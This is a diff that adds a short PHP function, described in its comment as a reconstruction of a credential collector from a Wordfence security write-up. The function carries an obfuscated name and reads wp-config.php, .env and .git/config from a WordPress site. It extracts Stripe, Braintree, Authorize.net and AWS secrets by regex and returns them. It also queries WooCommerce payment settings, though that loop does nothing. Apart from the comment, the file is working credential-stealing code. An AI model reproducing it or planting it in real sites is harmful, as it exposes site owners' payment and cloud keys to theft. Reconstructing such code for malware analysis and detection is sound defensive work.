@@ -1,0 +1,16 @@
+<?php
+// Reconstruction of the credential collector in Wordfence's write-up (2026-09).
+function cmok60d1b827y0twh() {
+	$found = array();
+	foreach (array(ABSPATH . 'wp-config.php', ABSPATH . '.env', ABSPATH . '.git/config') as $file) {
+		$text = @file_get_contents($file);
+		if (!$text) continue;
+		if (preg_match_all('#define\s*\(\s*[\'"]([A-Z_]*(?:STRIPE|BRAINTREE|AUTHORIZE|AUTHNET|AWS)[A-Z_]*)[\'"]\s*,\s*[\'"](.+?)[\'"]\s*\)#', $text, $m, PREG_SET_ORDER)) {
+			foreach ($m as $hit) { $found[$hit[1]] = $hit[2]; }
+		}
+	}
+	foreach (array('woocommerce_stripe_settings', 'woocommerce_braintree_settings') as $option) {
+		$settings = get_option($option, array());
+	}
+	return $found;
+}
